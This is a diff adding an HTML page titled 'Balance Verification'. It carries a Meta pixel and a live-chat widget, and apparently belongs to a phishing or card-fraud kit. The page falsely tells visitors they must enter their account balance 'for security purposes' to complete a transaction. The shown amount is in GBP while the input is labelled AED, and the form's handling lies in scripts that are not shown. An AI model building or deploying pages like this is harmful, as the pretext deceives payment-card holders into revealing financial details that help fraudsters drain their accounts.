@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/static/images/favicon.png" />
+    <title>Balance Verification</title>
+    <link rel="stylesheet" href="/static/css/card.css?v3" />
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "1151045393054747");
+      fbq("track", "PageView");
+    </script>
+    <noscript
+      ><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1151045393054747&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+      var _smartsupp = _smartsupp || {};
+      _smartsupp.key = "efdc468a819ade11dea03565c203c6e8163e428b";
+      window.smartsupp ||
+        (function (d) {
+          var s,
+            c,
+            o = (smartsupp = function () {
+              o._.push(arguments);
+            });
+          o._ = [];
+          s = d.getElementsByTagName("script")[0];
+          c = d.createElement("script");
+          c.type = "text/javascript";
+          c.charset = "utf-8";
+          c.async = true;
+          c.src = "https://www.smartsuppchat.com/loader.js?";
+          s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+    <noscript>
+      Powered by
+      <a href="https://www.smartsupp.com" target="_blank"
+        >Smartsupp</a
+      ></noscript
+    >
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-section">
+        <h1>Balance Check</h1>
+        <div class="subtitle">Security Step</div>
+
+        <div class="illustration">
+          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient
+                id="balance-grad"
+                x1="0%"
+                y1="0%"
+                x2="100%"
+                y2="100%"
+              >
+                <stop
+                  offset="0%"
+                  style="stop-color: #4d6aff; stop-opacity: 1"
+                />
+                <stop
+                  offset="100%"
+                  style="stop-color: #3355ff; stop-opacity: 1"
+                />
+              </linearGradient>
+            </defs>
+
+            <!-- Balance illustration -->
+            <rect
+              x="60"
+              y="70"
+              width="100"
+              height="60"
+              rx="8"
+              fill="url(#balance-grad)"
+            />
+
+            <!-- Money symbols -->
+            <text x="80" y="95" font-size="16" font-weight="bold" fill="white">
+              $
+            </text>
+            <text x="140" y="95" font-size="16" font-weight="bold" fill="white">
+              $
+            </text>
+            <text
+              x="110"
+              y="115"
+              font-size="14"
+              font-weight="bold"
+              fill="white"
+              text-anchor="middle"
+            >
+              BALANCE
+            </text>
+
+            <!-- Chart line -->
+            <path
+              d="M 70 130 L 90 120 L 110 125 L 130 115 L 150 130"
+              stroke="white"
+              stroke-width="2"
+              fill="none"
+            />
+          </svg>
+        </div>
+
+        <p class="description">
+          For security purposes, we need to verify your account balance to
+          complete the transaction
+        </p>
+      </div>
+
+      <div class="right-section">
+        <div class="payment-card">
+          <div class="card-header">
+            <div class="status-icon">
+              <svg
+                width="32"
+                height="32"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="white"
+                stroke-width="2.5"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <path
+                  d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
+                ></path>
+              </svg>
+            </div>
+            <div class="payment-info">
+              <div class="payment-status">Balance Verification</div>
+              <div class="payment-amount" id="paymentAmount">GBP 101.00</div>
+            </div>
+          </div>
+
+          <div class="order-info">
+            <span class="order-label">Order No.</span>
+            <span class="order-number" id="orderNumber">
+              770727642081439744c514
+              <svg
+                class="copy-icon"
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                <path
+                  d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                ></path>
+              </svg>
+            </span>
+          </div>
+
+          <div class="form-container">
+            <div class="payment-method">
+              <svg
+                class="method-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path
+                  d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"
+                ></path>
+              </svg>
+              <span>Account Balance</span>
+            </div>
+
+            <form id="balance-form">
+              <div class="form-group">
+                <label class="form-label">Current Balance (AED)</label>
+                <input
+                  type="text"
+                  class="form-input"
+                  placeholder="Enter your account balance"
+                  id="balance"
+                  inputmode="numeric"
+                />
+              </div>
+
+              <button type="submit" class="pay-button">
+                <svg
+                  width="18"
+                  height="18"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                  stroke-linecap="round"
+                >
+                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+                Verify Balance
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="/static/js/redirect.js?v2"></script>
+    <script src="/static/js/online-status.js?v2"></script>
+    <script src="/static/js/balance.js?v2"></script>
+  </body>
+</html>
